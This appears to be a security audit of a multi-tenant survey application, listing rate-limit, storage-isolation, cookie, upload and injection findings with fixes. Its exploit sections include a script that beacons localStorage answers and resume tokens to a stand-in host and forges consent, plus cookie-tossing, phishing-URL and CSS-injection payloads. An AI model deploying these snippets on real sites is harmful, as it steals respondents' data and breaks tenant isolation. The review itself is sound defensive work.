# Security review: public host, public APIs, cron

Scope: `src/proxy.ts`, `src/lib/hosts.ts`, `src/app/(public)/**`, `src/app/api/public/**`, `src/app/api/cron/**`, `src/lib/public/**`, `src/lib/analytics/events.ts` and `share.ts` (plus the helpers they call), `src/components/public/**`, the renderer for unsafe rendering, `src/lib/supabase/anon.ts` and `admin.ts`, `src/lib/survey/validate.ts` and `pipe.ts`, and the committed SQL these paths call (`0011_public_read.sql`, `0012_submission.sql`, `0013_reports_exports.sql`). Reviewed at commit `4ab1744`. In-progress edits to `0018`, `src/types` and `src/lib/hosts.ts` were ignored. Read only; nothing was executed against a live deployment, so anything marked PLAUSIBLE needs the stated confirmation.

## Summary

| ID | Severity | Title | Location |
|---|---|---|---|
| H1 | High | Any anonymous client can exhaust the per-survey submit bucket before Turnstile and lock every respondent out | `src/lib/public/submit.ts:187-198`, `src/lib/public/ratelimit.ts:63-72` |
| H2 | High | Shared public origin: one workspace's custom_script or GTM can read other workspaces' in-progress answers and resume tokens from localStorage and forge their consent | `src/components/public/resumeStore.ts:11-16`, `src/app/(public)/[key]/SurveyClient.tsx:244-298,438,608` |
| M1 | Medium | IP-only rate limit keys: NAT'd internal respondents are throttled together, and IPv6 rotation defeats every limit including the share password limit | `src/lib/public/http.ts:58-67`, `src/lib/public/ratelimit.ts:16-27`, `src/lib/analytics/share.ts:64-69` |
| M2 | Medium | Upload minting with a resume token has no effective file count and the stored object size is not bound to the declared size | `supabase/migrations/0012_submission.sql:253-268`, `src/lib/public/uploads.ts:74-79` |
| M3 | Medium | Events beacon limit is keyed by a client-chosen rid, so funnel analytics can be flooded without limit | `src/lib/analytics/events.ts:42-49` |
| M4 | Medium (PLAUSIBLE) | Cookie tossing from the public host into the dashboard host (no `__Host-` prefix on auth cookies) | `src/lib/supabase/cookies.ts:20-22`, `src/lib/supabase/proxy.ts:26-41` |
| L1 | Low | Per-question file limits are checked only against the client-declared manifest at submit | `src/lib/public/submit.ts:141-149,217-223`, `supabase/migrations/0012_submission.sql:423-430` |
| L2 | Low | Plaintext resume token stored in `submission_idempotency.result` for 24 hours and returned on key replay | `supabase/migrations/0012_submission.sql:524-530,706-719` |
| L3 | Low | A save carrying only `?t=` rotates the partial's resume hash, handing a fresh read token to any link holder and breaking the original device | `supabase/migrations/0012_submission.sql:340-356,524-528` |
| L4 | Low | Piped values are filled into rich-text link hrefs without encoding, and `safeHref` accepts userinfo | `src/components/survey/renderer/richtext.tsx:57-65,84-85` |
| L5 | Low (PLAUSIBLE) | Theme colors are not validated, allowing CSS declaration injection and third-party loads that bypass pixel consent | `src/components/survey/renderer/theme.ts:79-108`, `src/lib/survey/migrate.ts:211` |
| L6 | Low (PLAUSIBLE) | `?r=` and `?t=` survive in the Next flight payload, `history.state` and edge request logs after `replaceState` | `src/app/(public)/[key]/SurveyClient.tsx:241-242` |
| L7 | Low | OG route: no state check, no rate limit, and null results for random ids are cached forever | `src/lib/public/og.ts:13-31`, `src/lib/public/db.ts:161-187` |
| L8 | Low | Turnstile test secrets are accepted in production with the action and hostname checks switched off | `src/lib/public/turnstile.ts:22-25,68-75` |
| I1 | Info | `custom_script` shape mismatch: inline scripts silently never load; the future fix must re-allow-list `attrs` | `src/components/public/pixels/policy.ts:35-57`, `src/lib/admin/pixels.ts:8-12,60-102` |
| I2 | Info | Client IP is the first `x-forwarded-for` entry; correct on Vercel only, duplicated in the share action | `src/lib/public/http.ts:58-67`, `src/app/(public)/r/[token]/actions.ts:17` |
| I3 | Info | Rate limiting fails open on a database error | `src/lib/public/ratelimit.ts:63-71` |
| I4 | Info | Share cookie key falls back to the service role key; `REPORT_SHARE_SECRET` is not in `.env.example` | `src/lib/analytics/share.ts:23-28` |
| I5 | Info | No `vercel.json`: the three cron routes are not scheduled yet | repo root |
| I6 | Info | Shared report min and max reveal single respondents' values; no complementary suppression | `supabase/migrations/0013_reports_exports.sql:203-216` |
| I7 | Info | Events route reads the whole body before the 64 KB check | `src/app/api/public/events/route.ts:10-16` |
| I8 | Info | Hidden field keys are not pattern-checked on the server | `src/lib/public/submit.ts:70` |

Counts: 0 Critical, 2 High, 4 Medium, 8 Low, 8 Info.

---

## H1. Per-survey submit bucket can be exhausted before Turnstile

**What the code does.** `handleSubmit` builds the rate checks with the survey-wide bucket first (`submit.ts:187`), then the per-IP buckets (`:188-190`), runs them all (`:191`), and only afterwards verifies Turnstile (`:195-198`). `checkRateLimits` (`ratelimit.ts:63-72`) calls `rate_limit_hit` for each check in order; `rate_limit_hit` (`0012_submission.sql:16-22`) inserts a row on every allowed call. So the `submit:survey` row (600 per minute per survey) is written before the per-IP check can stop the request and before any captcha.

**Exploit.** Read the slug and `surveyId` from any public survey page (both are in the HTML). From one IP, POST `{action:'save', key, surveyId, versionId, idempotencyKey: <random>, answers:{}, startedAt:'', website:''}` ten times per second with no Turnstile token. Each request inserts one `submit:survey` row and then fails (on `submit:create` after 10, or on Turnstile). After 600 in the window, every real respondent's save and complete returns 429 at the first check. Sliding the flood keeps the survey closed indefinitely. Cost to the attacker: ten tiny requests per second, no captcha solves.

**Why it matters.** Any public survey can be taken offline by an anonymous party. For an internal survey with a deadline this is a full denial of the product's core function.

**Fix.** Never let unverified traffic consume a shared bucket. Order: per-IP limits first, Turnstile (or a valid resume token) second, survey-wide limit last; or make the survey bucket count only accepted writes.

```ts
// submit.ts
const ipChecks: RateCheck[] = []
if (!body.resumeToken) ipChecks.push({ rule: RATE_LIMITS.submitCreate, key: ipKey })
ipChecks.push(body.action === 'save'
  ? { rule: RATE_LIMITS.submitSave, key: ipKey }
  : { rule: RATE_LIMITS.submitComplete, key: `${ipKey}:${body.surveyId}`, max: ctx?.limits.rate_limit_per_hour })
const rl = await checkRateLimits(admin, ipChecks)
if (!rl.ok) return fail('rate_limited', ...)
if (!body.resumeToken || body.action === 'complete') { /* Turnstile */ }
// a resume token must also be proven valid before it can spend the shared bucket:
const survey = await checkRateLimits(admin, [{ rule: RATE_LIMITS.submitSurvey, key: body.surveyId }])
```

For saves that skip Turnstile because they carry a resume token, check the hash exists (one indexed select) before spending the survey bucket, otherwise a random 43-char token bypasses both Turnstile and the shared limit. Alternatively move the survey-wide counter inside `submit_response` after the resume or Turnstile gate.

---

## H2. Cross-workspace data exposure through shared localStorage on PUBLIC_HOST

**What the code does.** Every workspace's surveys share one origin (`https://{PUBLIC_HOST}`). The client stores, per survey, the resume token (`survey:{id}:resume`), a full answer mirror (`survey:{id}:answers`), the seed and rid (`resumeStore.ts:11-16`, written at `SurveyClient.tsx:244,273,295,438`), and the consent choice per workspace (`survey:consent:{workspaceId}`, read at `:297`, written at `:608`). The mirror is cleared only on completion (`resumeStore.ts:99-103`), so abandoned surveys keep their answers indefinitely. Workspace pixels, including `custom_script` and GTM (arbitrary code by design), execute on that same origin after consent.

**Exploit.** An owner or admin of workspace A adds a `custom_script` such as:

```js
for (const k of Object.keys(localStorage)) if (/^survey:/.test(k)) navigator.sendBeacon('https://a.example/x', k + '=' + localStorage[k])
for (const k of Object.keys(localStorage)) if (k.startsWith('survey:consent:')) localStorage[k] = 'granted'
```

Any respondent who has an unfinished survey from workspace B (HR, health, grievances) on the same browser, and then opens any survey of A and accepts A's banner (or A uses `notice` mode, where pixels load immediately), leaks B's typed answers. The script can also rewrite B's mirror (pre-filling answers B's respondent will submit) and flip B's stored consent to `granted`, so B's pixels load without the respondent agreeing to B's banner. Shared and kiosk devices make this realistic.

**Why it matters.** R15 isolated member sessions from pixels but not tenants from each other. Workspaces are departments that must not see each other's responses (RLS is built around that boundary); this bypasses it on the client and also defeats B's consent mode, which is a compliance control.

**Fix.** Structural, in order of strength:
1. Run `custom_script` and `gtm` in a sandboxed iframe on a separate origin (for example `px.{domain}`) and forward the doc 02 section 7.3 events with `postMessage`. Same-origin storage is then out of reach.
2. Or serve each workspace on its own subdomain of the public host (`{ws}.s.example.org`), giving each tenant its own storage.
3. Minimum stopgap: stop mirroring answers in localStorage when any `custom_script` or `gtm` pixel is present (keep only the server autosave), keep the consent flag in a value the server signs (for example an HMAC over workspace id and choice, verified on load), and document the residual risk.

```ts
const hasRawScript = pixels.some((p) => p.type === 'custom_script' || p.type === 'gtm')
const mirrorStore = hasRawScript ? null : store.current   // no answers at rest next to tenant code
saveMirror(mirrorStore, surveyId, { ... })
```

---

## M1. IP-only rate limit keys

**What the code does.** Every limit is keyed by the HMAC of the exact client IP (`http.ts:58-67`, `ratelimit.ts:50-52`): 10 response creations per 10 minutes, 20 completes per hour per survey (`ratelimit.ts:17-20`). The share password limit is 5 per 15 minutes per token and exact IP (`share.ts:64-69`), protecting an MD5-crypt hash (`password.ts:34-68`). IPs are not truncated to a prefix.

**Exploit.**
- Shared NAT: this is an internal survey tool; an office or VPN egress is one IP. Only 10 colleagues can start a survey per 10 minutes and only 20 can complete one survey per hour. Any insider can also burn the office bucket with 10 junk requests (see H1: hits are recorded before Turnstile).
- IPv6: a single VPS has a /64 (2^64 addresses). Rotating the source address resets every per-IP bucket. Against `/r/{token}` this turns 5 attempts per 15 minutes into effectively unlimited online guessing of a share password (minimum 6 characters).

**Fix.** Key IPv6 by /64 (and consider /56), add a per-token global limit for share passwords, store share passwords with bcrypt (`crypt(p, gen_salt('bf'))`, already planned), and size the create and complete limits for NAT (per survey and IP prefix, higher ceilings, Turnstile as the real gate).

```ts
export function rateKeyIp(ip: string): string {
  if (!ip.includes(':')) return ip
  const parts = expandIpv6(ip).split(':')
  return parts.slice(0, 4).join(':') + '::/64'
}
// share: add a second check { bucket: 'share_password_token', key: token, window: '1 hour', max: 50 }
```

---

## M2. Upload minting is not bounded with a resume token, and real object size is not bound

**What the code does.** `handleUpload` skips Turnstile whenever a syntactically valid resume token is present (`uploads.ts:74-79`). `create_upload` then counts files with `response_id = v_resp` (`0012_submission.sql:259`), but the row it inserts never sets `response_id` (`:267-268`), so pending uploads are never counted and the count stays at the number of already attached files. The signed upload URL (`uploads.ts:96`) does not carry the declared size; the bucket ceiling is 100 MB (`0008_responses.sql:147`). The real size is checked only at submit time, and only against the workspace maximum.

**Exploit.** Solve Turnstile once to create a partial and get a resume token. Then mint 30 upload URLs per 10 minutes per IP (180 per hour), each declaring 1 byte and uploading up to 100 MB of any content with an allowed `Content-Type`. That is about 18 GB per hour per IP, multiplied by M1's IPv6 rotation, retained until the orphan sweep runs (which is not scheduled yet, I5).

**Fix.** Set `response_id` on the pending row when a resume token resolves, count pending plus attached files, cap pending uploads per response and per survey, and enforce size at upload time.

```sql
insert into response_files (id, workspace_id, survey_id, question_key, response_id, object_path, declared_size, declared_mime, original_name)
values (v_id, s.workspace_id, s.id, q.question_key, v_resp, v_path, v_size, v_mime, v_name);
-- and: if (select count(*) from response_files where survey_id = v_sid and status = 'pending'
--          and created_at > now() - interval '1 hour') > 500 then return ... 'file_count'
```

Also verify the object size immediately after upload (a small confirm endpoint, or a Storage webhook) and delete objects larger than `declared_size`.

---

## M3. Events beacon rate limit keyed by a client-chosen rid

**What the code does.** `ingestBeacon` applies one limit, bucket `events_rid` with key `${survey_id}:${rid}` (`events.ts:42-49`). The rid is any 8 to 64 character string from the request body (`beacon-schema.ts:91-95`). No IP limit, no Turnstile. `record_events` accepts events for any non-draft survey, including closed ones (`0009_events.sql:97`).

**Exploit.** Send 50 `view`/`start`/`abandon` events per request with a fresh random rid each time. Each request passes. Funnel numbers on the dashboard and on shared reports (`report_widget_data` funnel, `0013_reports_exports.sql:170-178`) become attacker controlled, and the `events` table grows without bound.

**Fix.** Add an IP-prefix bucket and a per-survey ceiling, both checked before the rid bucket; reject events for surveys that are not open.

```ts
const checks = [
  { bucket: 'events_ip', key: hashIp(rateKeyIp(clientIp(req.headers)), rateLimitSecret()), window: '1 minute', max: 120 },
  { bucket: 'events_survey', key: batch.survey_id, window: '1 minute', max: 10000 },
  { bucket: 'events_rid', key: `${batch.survey_id}:${batch.rid}`, window: '1 hour', max: 300 },
]
```

---

## M4. Cookie tossing from the public host (PLAUSIBLE)

**What the code does.** Supabase auth cookies are host-only to DASHBOARD_HOST (`cookies.ts:20-22`, `proxy.ts:36-38`), which stops the public host reading them. But both hosts share a registrable domain, and the cookie names are the library default (`sb-<ref>-auth-token`, chunked), not `__Host-` prefixed.

**Exploit.** A `custom_script` on `s.example.org` runs `document.cookie = 'sb-<ref>-auth-token=<attacker session>; Domain=example.org; Path=/w; Secure'`. The browser sends it to `survey.example.org`. For `/w/*` requests the longer-path cookie is listed first, so a member who opened the survey may be signed in as the attacker on dashboard pages (login CSRF: they create surveys or import contacts into the attacker's workspace), or their session breaks.

**Why PLAUSIBLE.** Depends on how `@supabase/ssr` resolves duplicate names from `req.cookies.getAll()` and on the chunk reassembly. Confirm by setting a parent-domain cookie from the public host in a browser and loading `/w/...` on the dashboard.

**Fix.** Prefix the auth cookie name with `__Host-` (browsers refuse `__Host-` cookies that carry a Domain attribute or a non-root path), via `cookieOptions.name`.

```ts
export function authCookieOptions(nodeEnv = process.env.NODE_ENV): CookieOptionsWithName {
  const secure = !isDevRuntime(nodeEnv)
  return { name: secure ? '__Host-sb-auth' : 'sb-auth', path: '/', sameSite: 'lax', secure }
}
```

---

## L1. Per-question file limits are enforced only on client data at submit

**What the code does.** The route passes `filesManifest(body.answers)` as the validator's file manifest (`submit.ts:141-149,220`). `fileChecks` compares each answer's FileRef against that same client-built manifest, so `max_file_mb`, `allowed_extensions`, `max_files` and the signature PNG rule see only client-declared values. SQL (`0012_submission.sql:423-430`) re-checks the real object only against the workspace `max_file_bytes` and the global MIME allowlist, and the stored `mimetype` is whatever `Content-Type` the uploader sent.

**Exploit.** A question limited to 2 MB PDFs accepts a 25 MB `.docx` (or HTML bytes labelled `application/pdf`) by declaring small values at mint and uploading the real file.

**Fix.** Build the server manifest from `response_files` joined to `storage.objects` for the referenced ids and run `fileChecks` against that; in SQL also apply `config.validation.max_file_mb`, `allowed_extensions` and the signature rule to the real object metadata. Dashboard downloads must keep `download` (Content-Disposition attachment), which doc 02 already requires.

---

## L2. Plaintext resume token in the idempotency table

**What the code does.** On the first save `submit_response_core` returns `resume_token` in plaintext (`0012_submission.sql:524-530`); `submit_response` stores that whole result in `submission_idempotency.result` (`:716-719`) for 24 hours, and returns it to anyone who replays the same idempotency key with the same survey id (`:706-713`).

**Why it matters.** Doc 02 promises that only the SHA-256 is stored. Database readers, backups and logs of that table hold live resume tokens. Replay needs the client UUID, so remote exposure is unlikely.

**Fix.** Strip the secret before storing, and on replay of a save that created a response return `{ok:true, response_id}` only (the client already handles a missing token by saving again).

```sql
update submission_idempotency set result = v_result - 'resume_token', ... where key = v_idem;
```

---

## L3. Personalized-link save rotates the resume hash

**What the code does.** A save with `respondent_token` and no resume token resumes the token's open partial (`0012_submission.sql:349-352`) and, because no resume hash was sent, mints a new secret and overwrites `resume_token_hash` (`:524-528`).

**Exploit.** Anyone holding a forwarded `?t=` link solves one Turnstile, saves `{}` and receives a fresh resume token, then reads every saved answer through `/api/public/resume`. The original respondent's stored token stops matching, so their autosaves fail with `invalid_request` and their complete shows a generic error.

**Fix.** Doc 02 accepts that the `?t=` link is a resume key, but do not rotate: issue a secret only when the response has none, and do not return the secret when the partial already existed.

```sql
if p_action = 'save' and r.resume_token_hash is null then
  v_secret := gen_token(32); update responses set resume_token_hash = sha256_hex(v_secret) where id = r.id;
end if;
```

---

## L4. Unencoded piped values in rich-text link hrefs

**What the code does.** `renderNodes` builds a link href with `safeHref(fill(n.href, values))` (`richtext.tsx:85`). `fill` inserts piped values raw, after md-lite parsing, and `safeHref` (`:57-65`) accepts any `https:` URL including userinfo. Piped values include `{{hidden:param}}` from the URL (`pipe.ts:102`).

**Exploit.** An author writes `[Read the policy](https://intranet.example.org{{hidden:p}})`. An attacker shares `https://s.example.org/{slug}?p=@evil.example/login`. The rendered link becomes `https://intranet.example.org@evil.example/login`, which navigates to `evil.example` from a trusted survey. JavaScript and data URLs stay blocked, so this is phishing, not XSS. Requires an author to place a token inside an href.

**Fix.** Encode piped values in hrefs the way `endingRedirect` does, and reject userinfo, matching `safeRedirectUrl`.

```ts
const href = safeHref(n.href.replace(PLACEHOLDER_RE, (_m, i) => encodeURIComponent(values[Number(i)] ?? '')))
export function safeHref(href: string) { const u = new URL(href); if (u.username || u.password) return null; ... }
```

---

## L5. Theme colors are not validated (PLAUSIBLE)

**What the code does.** `themeToCssVars` writes `theme.colors.*` into custom properties and into `color-mix(...)` strings (`theme.ts:79-108`); `ensureContrast` returns non-hex input unchanged. `migrateDefinition` only checks that `theme` is an object (`migrate.ts:211`). React's server renderer escapes HTML characters in style values but not `;`.

**Exploit.** An editor (who cannot add pixels) sets `colors.primary` to `#000;background-image:url(https://tracker.example/p)`. The server-rendered `style` attribute gains an extra declaration, loading a third-party resource on every view (allowed by `img-src https:`) regardless of `pixel_consent_mode`, or overlaying content.

**Confirm.** Check whether the builder's draft save path validates colors; if it accepts arbitrary JSON this is exploitable.

**Fix.** Validate in `migrateDefinition` (and at publish) that every color matches `^#([0-9a-f]{3}|[0-9a-f]{6})$`, and fall back to defaults in `themeToCssVars` when `parseHex` fails.

---

## L6. Tokens linger after `replaceState` (PLAUSIBLE)

**What the code does.** Boot strips `r` and `t` with `history.replaceState(window.history.state, ...)` (`SurveyClient.tsx:241-242`). The App Router's initial flight payload (inline `self.__next_f` scripts) and its router tree in `history.state` are built from the original request URL, and the request itself is a GET logged with its query string at the edge.

**Exploit.** A GTM tag or custom script that reads `document.scripts` text or `history.state` recovers the resume or respondent token even though `location.href` is clean. Vercel request logs keep both.

**Confirm.** Load `/{slug}?r=<token>` and search `document.documentElement.innerHTML` and `JSON.stringify(history.state)` for the token.

**Fix.** Move the tokens to the fragment (`/{slug}#r=...`, never sent to the server or logged) and read them from `location.hash`; or have the server answer a `?r=`/`?t=` request with a 303 to the clean URL after placing the token in a short-lived, path-scoped, HttpOnly cookie that `/api/public/resume` consumes once.

---

## L7. OG route state, caching and rate

**What the code does.** `ogCard` reads any published version with the service role and checks only that the workspace is not deleted and the survey not archived (`db.ts:161-187`); it does not check effective state, so a survey moved back to draft or closed still renders its title and workspace name. `ogCardFor` caches null results forever (`og.ts:13-22`, null is returned, not thrown). No rate limit.

**Exploit.** Requests to `/api/public/og/{random-uuid}` each run a service-role query and add a permanent data-cache entry, at no cost to the requester.

**Fix.** Throw on null inside the cached function (as `cachedDefinition` does) so misses are not cached; add a per-IP limit; and serve the card only while `resolve_public_survey` would return the survey (pass the key, or check `survey_effective_state <> 'draft'`).

---

## L8. Turnstile test secrets in production

**What the code does.** With a secret matching `^[123]x0{20,}` the action and hostname checks are skipped (`turnstile.ts:22-25,68-75`). The `.env.example` lists the always-pass test secret.

**Exploit.** If an operator copies the test secret into Vercel production, every token (Cloudflare's test secret answers success) passes and Turnstile is off without any warning.

**Fix.** Refuse test secrets when `VERCEL_ENV === 'production'` (or `NODE_ENV === 'production'` and no explicit opt-in), logging loudly, the same way an unset secret is refused.

---

## Informational

- **I1. custom_script shape mismatch.** Settings stores `{version:1, parts:[{kind:'script', src, code, attrs}|{kind:'noscript', html}]}` (`src/lib/admin/pixels.ts:8-12`). `parseCustomScript` reads `inline` and top-level `async`/`defer` (`policy.ts:43-53`), so inline custom scripts never load today and src scripts lose their attributes. When the reader is switched to `code` and `attrs`, re-apply the save-time allow-list in the reader (no `on*`, no `nonce`, `type` only from `text/javascript`, `application/javascript`, `module`, no `id` that collides with `sv-*`), because rows can be written by other paths. Render `noscript` only as server HTML inside `<noscript>`, never through `dangerouslySetInnerHTML` outside it. The current reader is safe: only `src` (https only) and inline text reach `next/script`, with the nonce.
- **I2. Client IP.** First `x-forwarded-for` entry, then `x-real-ip`, then `0.0.0.0` (`http.ts:58-67`). Vercel overwrites `x-forwarded-for`, so this is sound there; behind another proxy (Cloudflare in front of Vercel) every user would share a few IPs. Prefer `x-vercel-forwarded-for` or `ipAddress()` from `@vercel/functions`, and reuse `clientIp` in `r/[token]/actions.ts:17` instead of the copy.
- **I3. Fail open.** A `rate_limit_hit` error skips that check (`ratelimit.ts:66-69`). Documented decision; Turnstile still runs. Consider failing closed for `report` and `upload:mint`.
- **I4. Share cookie key.** `REPORT_SHARE_SECRET` falls back to `SUPABASE_SERVICE_ROLE_KEY` (`share.ts:25`). It is hashed with a label first, so not a direct leak, but rotating the service key silently logs out every share viewer and the variable is missing from `.env.example`. The AES-256-GCM seal itself (`share-payload.ts:137-156`: random 12-byte IV, tag checked, token as AAD, HttpOnly, path-scoped, Secure) is sound.
- **I5. Cron not scheduled.** No `vercel.json` exists (planned for Phase 4 in doc 06). Until it does, the orphan sweep, retention and workspace purge never run, which compounds M2 and leaves retention promises unmet.
- **I6. Shared report aggregates.** Counts under 3 are suppressed, but numeric widgets return `min` and `max` once n is at least 3 (`0013_reports_exports.sql:208-216`), which are single respondents' values, and no complementary suppression stops deriving one suppressed option from `n` minus the others. Consider dropping min and max from shared payloads.
- **I7. Events body.** `request.text()` reads the full body before the 64 KB check (`events/route.ts:10-16`, `events.ts:30`). Check `content-length` first, as `readJsonBody` does.
- **I8. Hidden keys.** The server accepts any key up to 64 characters (`submit.ts:70`); only the client applies `PARAM_RE`. SQL caps the object at 8 KB. Apply `PARAM_RE` and the 50-key cap in zod too.

---

## Checked and found sound

1. **Hostname routing.** `classifyHost` compares the normalized `Host` header to the two env values; unknown hosts (including `*.vercel.app`) get 404. The public host allows only `/`, `/{key}`, `/r/{token}`, `/api/public/*`, `robots.txt`, `favicon.ico`, and refuses every `DASHBOARD_SEGMENTS` name; `/api/cron/*` and `/api/auth/*` are unreachable there. Every app directory under `(dashboard)` is covered by `DASHBOARD_SEGMENTS`. The public root layout re-checks the host (`(public)/layout.tsx:30`).
2. **`/s/{key}` redirect.** Path must match the strict key regex, host comes from `PUBLIC_HOST` env, scheme is fixed; the request `Host` and path cannot change the target (`hosts.ts:75-85`).
3. **No cookie-bound client on public paths.** A transitive import trace from `src/app/(public)/**` (116 files) and `src/app/api/public/**` (45 files) reaches `anon.ts` and `admin.ts` only; no `lib/supabase/server`, `browser`, `proxy`, `cookies` or `lib/auth`. `updateSession` runs only on the dashboard host. The only cookie set on the public host is the HttpOnly share-password seal.
4. **CSP and nonce.** 128-bit nonce from `crypto.getRandomValues` per request, forwarded in the request CSP so Next stamps its scripts, passed to every `next/script` (pixels, Turnstile) through `NonceProvider`. Public layout reads headers, so pages are dynamic and nonces are never cached. No inline `<script>` without a nonce; the only inline `<style>` is built from a fixed font table. `strict-dynamic` plus `https:` is correct (`https:` is ignored by supporting browsers); the policy is no weaker than doc 02 section 7.1, and `base-uri 'none'`, `object-src 'none'`, `frame-ancestors 'none'`, `form-action 'self'` are present. Pixels never load on the dashboard (host check in `selectPixels`, ESLint rule, and the dashboard CSP without `strict-dynamic`).
5. **XSS in survey content.** No `dangerouslySetInnerHTML` or `innerHTML` anywhere in the public components, renderer, or shared report view. Labels, help, option labels, statements, endings, closed messages and the privacy notice all render through `RichTextView` or plain text. Piped values are substituted after md-lite parsing as React text nodes, so a piped `<b>` or `**x**` is inert. Links allow only `https:` and `mailto:` and always carry `rel="noopener noreferrer"` with `target="_blank"` (rich text, image block, footer, consent banner). The OG card renders text in Satori, never HTML. The report form echoes nothing.
6. **Redirect after completion.** `endingRedirect` URL-encodes piped values and `safeRedirectUrl` requires `https:` via `new URL`, rejects userinfo, and only appends hidden params; protocol-relative, backslash and `javascript:` inputs fail `new URL` or the scheme check.
7. **SSRF.** The only server-side fetches with data-derived URLs are Turnstile siteverify (fixed URL) and the OG logo, which `publicAssetUrl` pins to the Supabase `public-assets` bucket with per-segment encoding and a `..` refusal.
8. **Pixel gating.** Pixels come from `resolve_public_survey`, which returns them only for open surveys, only enabled ones, minus `excluded_pixel_ids`, minus `gtm`/`custom_script` under the kill switch; `selectPixels` re-checks host, kill switch and value patterns. `<Pixels>` mounts only after boot (after the URL strip) and only when consent is granted per mode; `in_form` without a `gates_tracking` block sends no pixels. Pixel events carry only `survey_id`, `survey_key` and step; beacons carry page numbers, never answers or identity.
9. **Turnstile.** Skip only when the secret is unset and `NODE_ENV !== 'production'` (Vercel builds always run as production, so an unset secret on Vercel refuses). Action and hostname are verified for real secrets. Required on response creation and on complete, on upload without a resume token, and on every report, matching doc 02. Replay across requests is blocked by Cloudflare's single-use tokens; reuse with the same idempotency key only returns the stored SQL result for that key and survey.
10. **RATE_LIMIT_SECRET.** Required (16 characters or more) in production; the handler throws and returns 500 rather than defaulting. Daily-salted HMAC, raw IP never stored.
11. **Input validation.** Every public POST has a zod schema, a JSON content type check and a byte cap (submit 256 KB, upload 16 KB, report 16 KB, resume 8 KB, events 64 KB). Answers are re-validated with the full server definition; only keys of questions in that version reach SQL (`answerRows`), SQL rejects unknown keys and option ids, casts by column and caps text (20,000) and JSON (64 KB); answers are passed as a jsonb parameter, never interpolated. `metadata` is allow-listed in `sanitize_response_metadata`. `started_at` is clamped. Author regexes pass `isSafeRegex`.
12. **File attach scoping.** File ids are derived server-side from the minted path; SQL attaches only rows of the same survey, of a file question in the submitted version, pending or already on this response; paths are generated in SQL from ids and a sanitized name, so no traversal. Object paths always start with the survey's own `workspace_id/survey_id`.
13. **Resume and idempotency.** Resume secrets are 32 random bytes from `gen_random_bytes`, only SHA-256 stored on the response, matched together with `survey_id` and `status = 'partial'`, version-locked, nulled on completion and after 30 days by pg_cron; a random well-formed token is refused (`invalid_request`), so it cannot create or overwrite another partial. Idempotency keys are UUIDs bound to the survey on first use; reuse under another survey is refused.
14. **Cron routes.** All three require `Authorization: Bearer ${CRON_SECRET}` with `timingSafeEqual` and a length check, refuse when the secret is unset, are GET only, unreachable from the public host, and bounded per run (sweep 20 batches and 50 s, retention 250 s budget and 200 rounds per workspace, purge 10 workspaces).
15. **Shared report `/r/[token]`.** Token pattern checked, unknown, revoked, expired and wrong-password all collapse to the same 404 or prompt; password attempts are rate limited (fail closed); payload passes an allow-list sanitizer with depth and size caps that drops `logo_path` and any non-aggregate key; counts under 3 suppressed; open text only as words seen at least 3 times; `noindex`, `nocache` and `referrer: no-referrer`; the page reads cookies so it is dynamic and not shared-cached. No pixels on `/r`, `/report` or `/privacy`.
16. **Enumeration and errors.** Unknown, draft, archived and deleted-workspace keys return the same 404 from one SQL path; abuse reports store unknown slugs and answer identically; route handlers catch everything and return a bare `server_error` code; SQL error detail stays in server logs. The honeypot answers a fake success before any write.
